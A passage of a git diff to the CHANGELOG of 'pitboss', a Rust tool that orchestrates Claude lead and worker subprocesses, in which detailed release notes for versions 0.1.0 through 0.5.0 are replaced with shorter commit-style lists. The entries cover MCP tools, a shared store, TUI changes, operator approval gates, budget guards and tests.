-(missing OpenSSL sysroot on the `ubuntu-22.04` runner). No artifacts
-published. Superseded by 0.5.3.
 
 ## [0.5.0] — 2026-04-19
 
-### Added
-
-- **`pitboss attach <run-id> <task-id>`.** Follow-mode log viewer for a
-  single worker, resolved by run-id prefix. `--raw` streams the
-  underlying jsonl; without it, lines are formatted like the TUI focus
-  pane. Exits on Ctrl-C or when the worker's terminal `Event::Result`
-  arrives.
-- **SIGSTOP freeze-pause as opt-in pause mode.** `pause_worker` now
-  takes a `mode` ("cancel" / "freeze"). Default stays at cancel-style
-  (terminate + `claude --resume`, zero state loss on the Claude side).
-  Freeze SIGSTOPs the subprocess in place; `continue_worker` SIGCONTs
-  to resume — useful for short pauses where respawning would cost a
-  context reload, risky for long pauses (Anthropic may drop the HTTP
-  session). New `WorkerState::Frozen` variant tracked alongside Paused.
-- **Structured approval schema.** `request_approval` now accepts an
-  optional typed `ApprovalPlan` (rationale / resources / risks /
-  rollback). TUI modal renders the structured fields as labeled
-  sections, with risks in the warning color. Bare-summary approvals
-  still work unchanged.
-- **Plan approval flow (`propose_plan`).** New MCP tool the lead calls
-  *before* `spawn_worker`. When `[run].require_plan_approval = true`,
-  spawn_worker refuses until a plan submitted via propose_plan has
-  been operator-approved. Reuses the structured-approval modal with a
-  `[PRE-FLIGHT PLAN]` vs `[IN-FLIGHT ACTION]` badge in the title so
-  operators can tell the two kinds apart. On rejection, the plan gate
-  stays closed so the lead can revise and retry. Runs without the
-  opt-in flag behave identically to before.
-- **fake-claude ↔ mcp-bridge end-to-end test coverage.** fake-claude
-  now supports an opt-in bridge mode
-  (`PITBOSS_FAKE_MCP_BRIDGE_CMD` + `PITBOSS_FAKE_ACTOR_ID` +
-  `PITBOSS_FAKE_ACTOR_ROLE`) that spawns `pitboss mcp-bridge` as a
-  child and speaks stdio JSON-RPC to it — the same path a real
-  claude subprocess takes. New integration tests exercise:
-  - `_meta` injection end-to-end (bridge → dispatcher) via `kv_set`;
-  - pre-flight `propose_plan` gate with a real lead subprocess + real
-    control-socket operator;
-  - `pause_worker(mode="freeze")` / `continue_worker` with an actual
-    worker subprocess (via a test-only `FakeClaudeWorkerSpawner` that
-    rewrites `spawn_worker`'s command to fake-claude with the right
-    env overlay).
-  Closes the v0.3 Task 26 placeholder in `hierarchical_flows.rs` —
-  the empty `#[tokio::test]` stub has been removed.
-
 ## [0.4.4] — 2026-04-18
-
-### Added
-- **Dependabot configuration** (`.github/dependabot.yml`) — weekly cargo
-  + github-actions updates, patch/minor grouped into a single rollup PR,
-  major bumps opened individually for per-ecosystem review. GitHub-native
-  Dependabot alerts handle security advisories.
-
-### Fixed
-- **MCP lease cleanup on connection drop.** When an MCP session
-  terminates (worker crash, bridge killed, operator Ctrl-C), every
-  lease held by that session's actor is now released immediately
-  instead of waiting for the lease TTL. Implemented via a
-  per-connection `actor_id` slot on `PitbossHandler` populated from
-  `_meta` on the first tool call; the accept loop calls
-  `SharedStore::release_all_for_actor` after `rmcp serve` returns.
-  The long-standing `#[ignore]`'d integration test is now live and
-  passing.
-- **Resume with cleaned worktree fails fast.** `pitboss resume` on a
-  hierarchical run whose lead worktree was cleaned (the default
-  `worktree_cleanup = "on_success"` behavior) now errors clearly
-  with a remediation hint, instead of respawning claude into a new
-  directory and letting `claude --resume <session>` cryptically fail
-  to locate its session data. Future resumes: set
-  `[run] worktree_cleanup = "never"` on the original manifest.
-
-### Changed
-- **Price table matches by model family, not exact revision.** Older
-  and future same-family revisions (`claude-opus-4-5`,
-  `claude-sonnet-4-9`, etc.) now resolve to family rates
-  automatically instead of returning `None` and rendering "—". Add a
-  more specific branch before the generic family match if pricing
-  ever splits within a family.
-- **CI workflow deps updated** (via Dependabot): `actions/checkout`
-  v4 → v6, `softprops/action-gh-release` v2 → v3. Clears the Node.js
-  20 deprecation warning on every run.
-- **Compile-time parity between `TokenUsageSchema` and
-  `pitboss_core::parser::TokenUsage`** via bidirectional `From` impls
-  with exhaustive destructuring + a `const _` size-eq assertion.
-  Field rename/add/remove on either side now breaks the build
-  loudly instead of silently drifting the MCP tool schema.
 
 ## [0.4.3] — 2026-04-18
 
-### Added
-- **`TaskRecord.model` persistence.** Resolved model string is now
-  captured on the `TaskRecord` at spawn time (lead + workers, both
-  happy and spawn-fail paths) and round-tripped through JSON + SQLite.
-  Backward-compatible: `#[serde(default)]` on the new field means
-  pre-v0.4.3 records parse as `None`. SQLite store runs an idempotent
-  `migrate_task_model` migration on open. The TUI watcher prefers the
-  persisted model; log-scan fallback stays only for pre-v0.4.3 records.
-  Eliminates the ~100 MB/s of redundant disk reads the old fallback did
-  on every snapshot tick.
-- **Per-actor shared-store activity counters.** Each grid tile shows a
-  dim `kv:N lease:M` row when non-zero. Counters bump at tool-handler
-  entry — before authz — so failed attempts show up too (useful for
-  spotting workers spinning on bad paths). Surfaced via a new
-  `ControlEvent::StoreActivity { counters: Vec<ActorActivityEntry> }`
-  broadcast by the control server once per second per attached TUI.
-- **Mouse affordances in the TUI.**
-  - Left-click a grid tile — focus + open Detail view (equivalent to
-    `hjkl` + `Enter`).
-  - Left-click a run in the picker overlay — open that run (equivalent
-    to highlighting + `Enter`).
-  - Right-click inside Detail — exit back to the grid (symmetric with
-    `Esc`).
-  - Hit-test via per-frame cached tile/row rects in `AppState`, so
-    clicks stay accurate across resizes.
-
 ## [0.4.2] — 2026-04-18
 
-### Added
-- **Worker shared store.** Per-run, in-memory, hub-mediated coordination
-  surface for the lead and workers. Seven new MCP tools
-  (`mcp__pitboss__kv_get`, `kv_set`, `kv_cas`, `kv_list`, `kv_wait`,
-  `lease_acquire`, `lease_release`) exposed on the existing dispatcher
-  MCP server. Workers now get their own narrow `mcp-config.json`
-  (shared-store tools only — not spawn/cancel). Four namespaces:
-  `/ref/*` (lead write), `/peer/<actor-id>/*` (actor write + lead
-  override), `/shared/*` (all write), `/leases/*` (managed). Identity
-  injection via extended `pitboss mcp-bridge --actor-id` / `--actor-role`
-  flags stamping `_meta` into each forwarded MCP tool call. Ephemeral
-  per run; optional finalize-time dump to `<run-dir>/shared-store.json`
-  via `[run] dump_shared_store = true`. See
-  `docs/superpowers/specs/2026-04-18-worker-shared-store-design.md`.
-- **Unified TUI Detail view** (press `Enter` on a tile). Replaces the
-  legacy `L` log-overlay + Snap-in modes with a single split-pane view:
-  left pane shows identity, lifecycle, token totals + cost, activity
-  counters (tool calls / results / top tools), and a one-shot
-  `git diff --shortstat` summary. Right pane shows the scrollable log.
-- **`/peer/self/` path alias for shared-store writes.** Workers don't
-  have a natural way to discover their own actor_id (UUIDs are assigned
-  at spawn for dynamically-spawned workers). Paths starting with
-  `/peer/self/` are auto-resolved against the caller's actor_id, so
-  task prompts can say "write to `/peer/self/findings.md`" without
-  needing to template an id. Applies to `kv_get`/`kv_set`/`kv_cas`/
-  `kv_list`/`kv_wait`.
-- **In-flight git diff.** Dispatcher writes
-  `<run-dir>/tasks/<task-id>/worktree.path` at worker/lead spawn time,
-  so the Detail pane's GIT DIFF section shows live files-changed /
-  +lines / -lines before the TaskRecord lands on finalize.
-- **In-flight token + model stats.** Watcher scans each task's
-  `stdout.log` for per-turn `message.usage` and `message.model` so
-  token totals + model family populate from the first assistant turn,
-  not only after finalize. Dynamic workers (not in `resolved.json`)
-  finally get their model surfaced.
-- **Tile signifiers.** Every grid tile now shows a
-  model-family color swatch (opus = magenta, sonnet = blue, haiku =
-  green) and a role glyph in its title (★ lead, ▸ worker), replacing
-  the old `[LEAD]` text prefix.
-- **Log pane QoL.** Per-event caps raised 3-5× with a `… +N chars`
-  truncation marker; scroll-back buffer 500 → 2000 lines; new `J`/`K`
-  keybinds scroll 5 rows (fills the gap between `j`/`k` = 1 and
-  Ctrl-D/U = 10); mouse wheel bumped from 3 → 5 rows/tick.
-- **Reset script for recurring dogfood.** `scripts/reset-ketchup-p0-dogfood.sh`
-  tears down stale pitboss worktrees + `demo/ketchup-p0-*` branches
-  and resets the ketchup checkout to the `dogfood/p0-baseline` tag so
-  the 5-worker P0 refactor test is reproducible.
-
 ### Fixed
-- **Kill commands now actually kill.** Two compounding bugs unified
-  under one fix: (a) TUI's control-socket `send_op` ran on a fresh
-  tokio runtime per call while the `ControlClient` writer was
-  registered with the TUI startup runtime — cross-runtime async I/O
-  silently hung. Switched to a stashed `Handle::spawn`. (b) `CancelRun`
-  only terminated the lead-only `state.cancel` token; worker cancel
-  tokens in `state.worker_cancels` were not cascaded. Both the TUI-driven
-  `CancelRun` op and `dispatch/hierarchical.rs` finalize now iterate
-  and terminate every worker token, so workers actually stop.
-- **TUI log-pane bleed.** Detail-view log lines containing non-ASCII
-  graphemes (e.g. `√`, `—`) could land cells past the pane's right
-  edge into the metadata pane. ratatui 0.29's `Paragraph::render_text`
-  has no `x < area.width` guard; we now paint via `Buffer::set_stringn`
-  with an explicit `max_width` for guaranteed containment.
-- **TUI scroll units.** Detail log scroll is now tracked in visual
-  rows (post-wrap) rather than log-line indices, so long wrapped lines
-  don't eat scroll budget and `jump-to-bottom` actually shows the end
-  of the log regardless of wrap.
 
-### Changed
-- **MCP `structuredContent` is now always a record.** The shared-store
-  tools `kv_get`, `kv_list`, and `list_workers` previously returned
-  bare `null` / arrays, which Claude Code's MCP client rejected with
-  `{"code":"invalid_type","message":"expected record, received ..."}`.
-  Return shapes are now `{ entry: ... }`, `{ entries: [...] }`, and
-  `{ workers: [...] }` respectively. **Breaking for callers** that
-  expected bare arrays/nulls — unwrap one level.
-- **Shared-store `Forbidden` errors now include caller's actor_id and
-  a remediation hint.** Previously, "workers may write only their own
-  `/peer/<self>/*`" left workers guessing what `<self>` resolves to.
-  The message now names both the target peer and the caller's actual
-  `actor_id`, and points at `/peer/self/...` as the always-correct
-  path.
-- **Run id abbreviation in TUI title bar** switched from the
-  leading 8 chars (`019da1b8…`) to the last UUID segment
-  (`…146e21f77dd8`). UUIDv7 time-prefixes collide across sibling runs
-  from the same minute; the random tail actually differentiates.
+- Assert shape of `pitboss version` instead of pinning 0.1.0
+
 
 ## [0.4.1] — 2026-04-18
 
 ### Added
-- **`fake-claude` MCP-client mode.** When `PITBOSS_FAKE_MCP_SOCKET` is
-  set, the test-support `fake-claude` binary connects to a pitboss MCP
-  socket and can issue real tool calls from a new `mcp_call` script
-  action. Supports named bindings + whole-string template substitution
-  (`"$w1.task_id"`) for chaining tool calls — covers realistic lead
-  patterns in integration tests.
-- **`crates/pitboss-cli/tests/e2e_flows.rs`** — four new end-to-end
-  tests driving a real `fake-claude` subprocess through `SessionHandle`
-  + `TokioSpawner`: spawn+wait happy path, 3-worker fan-out with
-  wait_for_any, mid-flight cancel, and a full approval round-trip
-  exercising the MCP→bridge→control→control→bridge→MCP loop with
-  `fake-control-client`. Unlocks v0.4.1 feature development without
-  Anthropic API calls.
-- **`mcp__pitboss__reprompt_worker` MCP tool.** Lead-facing counterpart
-  to the v0.4.0 operator-only `RepromptWorker` control-socket op. Lets
-  a lead correct a wandering worker mid-flight with a new prompt while
-  preserving the worker's claude session via `--resume`. Matches the
-  control-socket op's state machine, event writes, and counter semantics
-  exactly; prompt is required (not optional like `ContinueWorkerArgs`).
-- **Notifications plugin system.** Trait-based `NotificationSink`
-  abstraction in `pitboss-cli::notify` with four concrete sinks:
-  `LogSink`, `WebhookSink`, `SlackSink`, `DiscordSink`. Routed via
-  `NotificationRouter` with per-sink event filters (`events =
-  [...]`) and `severity_min`. Typed `PitbossEvent` enum with three
-  variants (`approval_request`, `run_finished`, `budget_exceeded`).
-  Config via new `[[notification]]` manifest section; env-var
-  substitution (`${FOO}`) for URLs. Fire-and-forget per sink via
-  `tokio::spawn`, 3-attempt exponential backoff (100ms → 300ms →
-  900ms), LRU dedup cache (size 64) prevents retry storms. New
-  `TaskEvent::NotificationFailed` variant records delivery failures
-  in `events.jsonl`.
-- **Semantic log-line coloring.** TUI's focus-log pane and full-screen
-  snap-in view now color each stream-json line by event type: white
-  for assistant text, cyan for tool use, green for tool results, gray
-  for system/unknown, magenta for result events, yellow for rate
-  limits. Driven by the new `pitboss_tui::theme::log_line_style`
-  helper. Unparseable lines fall back to gray.
-- **Aborted run status.** `RunStatus` enum in `pitboss-tui::runs`
-  distinguishes `Complete` (summary.json finalized), `Running`
-  (task records in summary.jsonl, no summary.json yet), and `Aborted`
-  (dispatcher wrote manifest + resolved but never produced any task
-  records). Run picker overlay and `pitboss-tui list` both use the
-  new label — orphaned run dirs no longer masquerade as running.
-- **Refreshed TUI legends.** Statusbar hint now lists the full v0.4
-  keybinding ladder (`hjkl`, `Enter`, `L`, `x/X`, `p/c`, `r`, `o`,
-  `?`, `q`). Help overlay reorganized into Navigation / Views /
-  Control / System sections and sized up to 70% × 80% to fit the
-  v0.4 additions. Stale "OBSERVE mode" + "r = force refresh"
-  footer lines removed.
 
-### Fixed
-- Control-socket `approve` op now writes the `approval_response` event
-  to `events.jsonl` and increments `worker_counters.approvals_{approved,
-  rejected}` — matching `ApprovalBridge::respond`'s audit trail. The
-  v0.4.0 queue-drain path bypassed `respond`, so approvals drained on
-  TUI connect produced no response event and didn't bump counters.
-  Surfaced by the new e2e approval round-trip test.
-- **TUI tile grid no longer retains prior-frame content in empty cells.**
-  `render_tile_grid` now calls `frame.render_widget(Clear, area)`
-  before drawing tiles, so partial-final-row dead space stays clean.
-  Observed as character leakage during Stage 1 dogfood run (#129).
-- **TUI summary/count responsiveness improved.** Watcher poll interval
-  lowered from 500ms to 250ms; on-disk `summary.jsonl` writes now
-  surface in the TUI within 250ms instead of up to 500ms (#128).
-- **TUI text word-wraps at window width in log/tile/overlay bodies.**
-  Added `Wrap { trim: false }` to Paragraphs in `render_tile`,
-  `render_focus_log`, `render_snap_in`, `render_run_picker_overlay`,
-  and `render_approval_modal`. Title bar and status bar intentionally
-  stay single-line (truncation is desired there) (#130).
-- **TUI color usage consolidated.** New `pitboss_tui::theme` module
-  holds palette constants + style helpers. Status colors and UI
-  accent colors flow through `theme::*` instead of inline `Color::*`
-  literals scattered across `tui.rs`. No user-visible change in most
-  views; fixes accidental drift where the same semantic state
-  rendered in different colors in different contexts (#131).
-- **TUI event loop handles `Event::Resize` + tracks layout-changing
-  transitions.** Previously the loop matched only on `Event::Key`
-  and silently dropped Resize events, so ratatui's autoresize
-  shuffled buffer content when width changed and the diff left stale
-  physical cells. A new `dirty` flag triggers `terminal.clear()`
-  on resize, focus change, mode transition, and `SwitchRun` — one
-  frame of flicker per transition in exchange for reliably clean
-  redraws across terminal emulators. Common-case leakage fixed;
-  occasional emulator-specific cells remain a known follow-up.
+- Emit BudgetExceeded envelope at budget-guard error site
+- Build notification router in runner::execute; emit RunFinished (flat)
+- Emit ApprovalRequest envelope in ApprovalBridge::request
+- Add notification_router field (None default) to DispatchState
+- Add TaskEvent::NotificationFailed variant
+- Reject malformed [[notification]] configs at parse time
+- Resolve [[notification]] with env-var substitution; update literals
+- Add [[notification]] section to Manifest
+- Add DiscordSink (embed format, color-by-severity) + 3 wiremock tests
+- Add WebhookSink + 3 wiremock tests (success/4xx/5xx)
+- Add SlackSink (Block Kit formatting) + 3 wiremock tests
+- Add LogSink with tracing_test unit test
+- Add NotificationRouter with LRU dedup + retry + 3 integration tests
+- Add NotificationConfig + env-var substitution with 8 unit tests
+- Add NotificationSink trait (async_trait)
+- Add NotificationEnvelope with auto-derived dedup_key
+- Add PitbossEvent enum with 3 variants + kind() helper
+- Add Severity enum with ordered filtering support
+
+
+### Dependencies
+
+- Add reqwest/async-trait/lru/wiremock/tracing-test for notifications
+
 
 ## [0.4.0] — 2026-04-17
 
-### Added
-- **Live control plane.** Per-run `control.sock` unix socket carrying
-  line-JSON operations from `pitboss-tui` to the dispatcher and push
-  events back. New TUI keybindings: `x` cancel focused worker (with
-  confirm modal), `X` cancel entire run, `p` pause, `c` continue, `r`
-  reprompt (textarea-driven).
-- **Three new MCP tools.** `mcp__pitboss__pause_worker`,
-  `mcp__pitboss__continue_worker`, `mcp__pitboss__request_approval` —
-  the last blocks the lead until the operator approves, rejects, or
-  edits, LangGraph-`interrupt()`-style.
-- **`approval_policy` manifest field** under `[run]`. Values: `block`
-  (default), `auto_approve`, `auto_reject`.
-- **Pause = cancel-with-resume.** Pause terminates the worker
-  subprocess but preserves `claude_session_id`; `continue_worker`
-  spawns `claude --resume <id>`.
-- **Per-task `events.jsonl`** audit file: pause, continue, reprompt,
-  approval_request, approval_response events.
-- **5 new `TaskRecord` counters.** `pause_count`, `reprompt_count`,
-  `approvals_requested`, `approvals_approved`, `approvals_rejected`.
-  Backfilled on disk via `#[serde(default)]` and in SQLite via the
-  idempotent `migrate_v04_event_counters` migration.
-- **`examples/v0.4-approval-demo.toml`** — minimal hierarchical
-  manifest that exercises `approval_policy = "block"` + a
-  `request_approval` interrupt + three tiny workers, for manual
-  smoke-testing of the new keybindings.
+### ROADMAP
 
-### Changed
-- `WorkerState::Running` now carries an `Option<String> session_id`;
-  `WorkerState::Paused` is a new variant.
-- `DispatchState::new` gained an `ApprovalPolicy` parameter.
-- The lead's allowed MCP tool list now includes the three new tools.
+- Promote TUI kill into v0.4 scope; capture new deferred items
 
-### Backward compatibility
-- v0.3.x manifests run unchanged; `approval_policy` defaults to
-  `block`.
-- v0.3.x runs on disk deserialize with counter fields defaulting to 0.
-- SQLite DBs auto-migrate on next open.
-- TUI pointed at a v0.3.x completed run enters observe-only mode when
-  `control.sock` is absent.
 
-## [0.3.4] — 2026-04-17
+### Scripts
 
-### Added
-- **`AGENTS.md`** — agent-facing entry point with decision tree, full
-  manifest schema reference, invocation patterns, run-directory
-  interpretation guide, the 6 MCP tools, error patterns, and 4
-  canonical examples (including a ketchup refactor case study).
-- **`ROADMAP.md`** — deferred-work capture: near-term TUI kill
-  design, medium-term features (broadcast, depth > 1, peer messaging,
-  plan approval, full fake-claude E2E), explicitly retired items
-  (interactive snap-in), and non-goals.
-- **`examples/ketchup-refactor.toml`** — literal manifest used for the
-  canonical AGENTS.md case study. 4-worker hierarchical audit on
-  Haiku.
-- **`x86_64-apple-darwin` target retired** from release workflow matrix
-  (Intel Macs are EOL for new builds; Apple Silicon and Linux x86_64
-  remain).
+- Pass --run-dir to smoke-part1 dispatches ([#5](https://github.com/SDS-Mode/pitboss/pull/5))
 
-### Changed
-- `scripts/smoke-part1.sh` passes `--run-dir "$SCRATCH/runs"` to every
-  `pitboss dispatch` call so the script's trap cleanup sweeps test
-  run artifacts. Previously a few cases left orphan dirs under
-  `~/.local/share/pitboss/runs/`.
-- `README.md` gains a one-line pointer to AGENTS.md at the top.
+
+### V0.3.4
+
+- AGENTS.md + canonical ketchup example ([#4](https://github.com/SDS-Mode/pitboss/pull/4))
+
+
+### V0.4.0
+
+- Live control plane + approval interrupts ([#6](https://github.com/SDS-Mode/pitboss/pull/6))
+
 
 ## [0.3.3] — 2026-04-17
 
-### Added
-- `aarch64-apple-darwin` and `x86_64-apple-darwin` release targets alongside
-  the existing `x86_64-unknown-linux-gnu`. `pitboss-core` now enables
-  `git2`'s `vendored-libgit2` feature so cross-compilation on macOS
-  runners doesn't depend on a system libgit2.
-- `server_drops_cleanly_even_with_active_connection` regression test
-  asserting `McpServer::drop` completes within 500 ms even when a unix
-  socket session is still open.
-
-### Changed
-- **MCP session cleanup.** `McpServer` now tracks per-connection tasks
-  via `tokio_util::task::TaskTracker` and a `CancellationToken`. On
-  drop, the token is cancelled so in-flight sessions exit their select
-  arms immediately instead of running until their internal session
-  timeout (up to 3600 s). Closes the reviewer-flagged orphan-task
-  concern.
-- **SQLite row projection.** `fetch_task_records` and `fetch_run_row`
-  used to return 15- and 8-element positional tuples from
-  `rusqlite::Row::query_map`, coupling field order to SQL column order.
-  Replaced with `TaskRow` and `RunRow` structs that read by column name
-  via `row.get("column_name")`. Adding a new column no longer silently
-  re-maps existing fields. Two `#[allow(clippy::type_complexity)]`
-  suppressions removed.
-
-### Removed
-- Module-wide `#![allow(dead_code)]` suppressions from
-  `pitboss-cli/src/mcp/server.rs`, `mcp/tools.rs`, and
-  `dispatch/state.rs`. The suppressions were vestigial from early
-  development; every item is now wired up, so clippy runs clean
-  without them.
-- Unused `_store: Arc<dyn SessionStore>` parameter from
-  `dispatch/runner.rs::execute_task`. Was a "planned but never wired"
-  forward-reference.
-
 ## [0.3.2] — 2026-04-17
 
-### Fixed
-- TUI worker-switch latency. `pitboss-tui`'s watcher now wakes immediately
-  on a focus change (`focus_rx.recv_timeout` replaces a 500 ms
-  `thread::sleep`), dropping perceived switch latency from up-to-half-a-
-  second to just the rebuild cost.
-- `tail_log` seeks to the last 256 KiB of the log file instead of reading
-  and parsing the entire file every poll. Per-poll work is now
-  O(constant) regardless of log size; previously a 2 MB log meant
-  10–30 ms of redundant parse work twice per second.
+### README
 
-### Added
-- README: `Install` section leads with pre-built tarball install; `Shell
-  completions` subsection; `Continuous integration` + `Cutting a release`
-  docs under Development.
-- Three `tail_log` regression tests covering small files, >256 KiB files
-  with mid-seek partial-line drop, and missing files.
+- Document install-from-release, completions, CI, release process
+
+
+### Pitboss-tui
+
+- Interruptible watcher + seek-based log tail ([#2](https://github.com/SDS-Mode/pitboss/pull/2))
+
 
 ## [0.3.1] — 2026-04-17
 
-### Added
-- GitHub Actions CI on every push/PR to `main`: `cargo fmt --all --check`,
-  `cargo clippy --workspace --all-targets --all-features -- -D warnings`,
-  `cargo test --workspace --features pitboss-core/test-support`, and
-  `scripts/smoke-part1.sh`. Cached with `Swatinem/rust-cache@v2`.
-- GitHub Actions release workflow triggered by `v*` tag push: builds
-  cross-platform binaries and attaches `pitboss-<version>-<target>.tar.gz`
-  archives to the GitHub release.
-- `pitboss completions <shell>` and `pitboss-tui completions <shell>`
-  subcommands generating shell completions for bash, zsh, fish, elvish,
-  and powershell via `clap_complete`.
-- `CHANGELOG.md` covering v0.1.0 through v0.3.1.
-
-### Fixed
-- Two clippy lints introduced in rustc 1.95 that the local 1.94 missed:
-  `unnecessary_sort_by` in `pitboss-tui/src/runs.rs` (switched to
-  `sort_by_key` + `cmp::Reverse`) and `map_unwrap_or` in
-  `pitboss-tui/src/watcher.rs` (switched to `Result::is_ok_and`).
-
 ## [0.3.0] — 2026-04-17
 
-### Added
-- Hierarchical dispatch mode: a lead `claude` subprocess dynamically spawns
-  workers via MCP tool calls over a unix socket. Six tools:
-  `spawn_worker`, `worker_status`, `wait_for_worker`, `wait_for_any`,
-  `list_workers`, `cancel_worker`.
-- House rules for hierarchical runs: `max_workers` (<=16), `budget_usd` with
-  reservation accounting + per-worker model tracking, `lead_timeout_secs`.
-- `pitboss mcp-bridge <socket>` subcommand — stdio<->unix-socket proxy that
-  bridges Claude's MCP client to the pitboss MCP server. Auto-launched by
-  the lead's generated `--mcp-config`.
-- TUI annotations: `[LEAD] <id>` prefix on lead tiles, `<- <lead-id>` on
-  worker tiles, `— N workers spawned` status-bar counter, dynamic-worker
-  discovery from summary.jsonl + filesystem.
-- `parent_task_id: Option<String>` on `TaskRecord` with backward-compatible
-  JSON deserialization.
-- SQLite migrations: `parent_task_id` column + `shire_version` ->
-  `pitboss_version` column rename, both idempotent via `pragma_table_info`.
-- `pitboss resume` now works for hierarchical runs — re-dispatches the lead
-  with `--resume <session-id>`; workers are not individually resumed.
-- `pitboss validate` prints a hierarchical summary when a `[[lead]]` section
-  is present.
+### README
 
-### Changed
-- **Rebrand**: crates renamed (`mosaic-core` -> `pitboss-core`, `shire-cli`
-  -> `pitboss-cli`, `mosaic-tui` -> `pitboss-tui`); binaries renamed
-  (`shire` -> `pitboss`, `mosaic` -> `pitboss-tui`); default runs dir now
-  `~/.local/share/pitboss/runs/`; env vars under `PITBOSS_*`; MCP server
-  name and tool prefix are `pitboss` / `mcp__pitboss__*`; README rewritten
-  with a pit-boss-at-a-casino aesthetic.
-- `truncate_preview` in `pitboss-core/src/session/handle.rs` now iterates
-  by character instead of byte-slicing, so multi-byte UTF-8 (emoji) in
-  claude output no longer panics the parser.
+- Drop "dealer" — use worker/lead throughout
+- Casino aesthetic — dealers, house rules, the pit
+- Tighten + reflect v0.3 state
+- Document v0.3 hierarchical mode with example
 
-### Fixed
-- Budget-guard TOCTOU: burst spawning used to bypass `budget_usd` because
-  the guard only checked `spent_usd`. Now reserves the estimated cost at
-  spawn time and releases it on completion.
-- Budget estimator used to hardcode Haiku rates when pricing historical
-  workers, undercounting Sonnet/Opus runs. Each worker's actual model is
-  now tracked and used for both historical and fallback estimates.
+
+### SqliteStore
+
+- Add parent_task_id column with idempotent migration
+
+
+### Dispatch
+
+- Hierarchical mode detection + run_hierarchical scaffold
+- DispatchState shared between runner and MCP server
+
+
+### Fake-mcp-client
+
+- Real rmcp client connect + call_tool
+
+
+### Hierarchical
+
+- Auto-allow shire MCP tools in lead's --allowedTools
+- Shire mcp-bridge subcommand for stdio↔socket proxy
+- Fake-claude tool_use emission + deferred e2e placeholder
+- Integration tests for cap/budget/drain guards
+- Integration test for spawn + list round-trip
+- Cancel in-flight workers on lead exit + persist records
+- Spawn lead with --mcp-config and persist its record
+
+
+### Manifest
+
+- Hierarchical-mode validation (mutex, ranges, lead checks)
+- Resolve [[lead]] into ResolvedLead with defaults inheritance
+- Add [[lead]] section and hierarchical [run] fields
+
+
+### Mcp
+
+- Budget reservation + per-worker model tracking
+- Wire real worker subprocess spawn + cost accounting + prompt preview
+- Per-worker CancelToken in DispatchState; cancel_worker targets one
+- Defensive re-scan in wait_for_worker + wait_for_any
+- Wire six tools into rmcp ServerHandler on UnixListener
+- Wait_for_any — race waiter across multiple task_ids
+- Wait_for_worker with broadcast channel + timeout path
+- Worker_status + cancel_worker handlers (minimal, refined in Task 22)
+- Spawn_worker guards (cap, budget with median estimate, drain)
+- Handle_spawn_worker happy path (no guards, no real spawn yet)
+- Handle_list_workers tool handler with filtering and state mapping
+- Server start/stop lifecycle with unix-socket listener
+- Module scaffolding + socket path helper
+
+
+### Mosaic-tui
+
+- Watcher discovers lead + dynamic workers for hierarchical runs
+- Status bar shows '<N> workers spawned' counter
+- Worker tiles show ← <parent-id> annotation
+- [LEAD] prefix + bold border on lead tile
+- Thread parent_task_id through TileState from TaskRecord
+
+
+### Pitboss-tui
+
+- Rebrand missed strings in title bar and help overlay
+
+
+### Rebrand
+
+- Shire → pitboss across paths, env vars, MCP names, SQLite schema
+
+
+### Session
+
+- Fix truncate_preview panic on multi-byte boundaries
+
+
+### Shire
+
+- Validate shows hierarchical manifest summary
+
+
+### Sqlite
+
+- Cover re-open idempotency + refresh schema evolution note
+
+
+### V0.3.1
+
+- WorkerStatus JsonSchema, lead tile Cyan border, README resume note
+
 
 ## [0.2.2] — 2026-04-17
 
-### Added
-- `pitboss diff <run-a> <run-b>` subcommand: side-by-side run comparison
-  with totals, per-task metrics, only-in-A / only-in-B sections, and
-  `--json` output for scripting. Useful as a before/after tool with
-  `pitboss resume`.
-
-### Changed
-- Moved `prices` module from the TUI crate to core so both binaries
-  (pitboss + pitboss-tui) can compute cost from `TokenUsage`.
-
-### Fixed
-- Non-TTY progress table now emits exactly one line per completed task
-  instead of repeating the last-registered task's row on every state
-  change. Three regression tests lock the fix.
-
 ## [0.2.1] — 2026-04-17
-
-### Added
-- Run picker in the TUI (`o` to switch between runs without relaunching).
-- SQLite session store alongside the existing JSON file store
-  (`rusqlite` with bundled sqlite; `runs` + `task_records` tables with
-  full init/append/finalize/load round-trip).
-- `pitboss resume <run-id>` for flat-mode runs (reuses
-  `claude_session_id` via `--resume <id>` in spawn args).
-- View-only snap-in mode: press Enter on a running tile to enter a
-  full-screen log view with scrolling.
-- Cost estimation per tile (price-table lookup per model).
-- Wall-clock run timer in the status bar.
 
 ## [0.2.0] — 2026-04-17
 
-### Added
-- TUI (`pitboss-tui`, then `mosaic`): tile grid of task state, live log
-  tailing (stream-json parsed), 500 ms polling, read-only observation.
-  Keybindings `h/j/k/l`, `L`, `r`, `?`, `q`; non-interactive `list` and
-  `screenshot` subcommands.
-- Stats bar with tokens + duration; per-task stderr routed to
-  `stderr.log`.
-
-### Fixed
-- Dispatcher now calls `store.append_record` on each task completion
-  (spec §5.3 invariant was silently violated in v0.1). Regression test
-  added.
-- `--verbose` wired into claude spawn args so stream-json output flows
-  correctly.
-- `summary.jsonl` persistence restored.
-
-## [0.1.0] — 2026-04-16
-
-### Added
-- Headless dispatcher (`pitboss`, then `shire`) reading a TOML manifest
-  and fanning out `claude` subprocesses under a concurrency cap.
-- Per-task git worktree isolation.
-- Stream-JSON parser for Claude output with token/cost accounting.
-- Structured run artifacts: manifest snapshot, resolved config,
-  summary.json, summary.jsonl, per-task logs.
-- Graceful Ctrl-C handling: single SIGINT drains running tasks; second
-  SIGINT terminates.
-- Part 1 offline smoke test harness (`scripts/smoke-part1.sh`, 10 tests).
-
-[Unreleased]: https://github.com/SDS-Mode/pitboss/compare/v0.8.0...HEAD
-[0.8.0]: https://github.com/SDS-Mode/pitboss/compare/v0.7.0...v0.8.0
-[0.7.0]: https://github.com/SDS-Mode/pitboss/compare/v0.6.0...v0.7.0
-[0.6.0]: https://github.com/SDS-Mode/pitboss/compare/v0.5.5...v0.6.0
-[0.5.5]: https://github.com/SDS-Mode/pitboss/compare/v0.5.3...v0.5.5
-[0.5.3]: https://github.com/SDS-Mode/pitboss/compare/v0.5.0...v0.5.3
-[0.5.0]: https://github.com/SDS-Mode/pitboss/compare/v0.4.4...v0.5.0
-[0.4.4]: https://github.com/SDS-Mode/pitboss/compare/v0.4.3...v0.4.4
-[0.4.3]: https://github.com/SDS-Mode/pitboss/compare/v0.4.2...v0.4.3
-[0.4.2]: https://github.com/SDS-Mode/pitboss/compare/v0.4.1...v0.4.2
-[0.4.1]: https://github.com/SDS-Mode/pitboss/compare/v0.4.0...v0.4.1
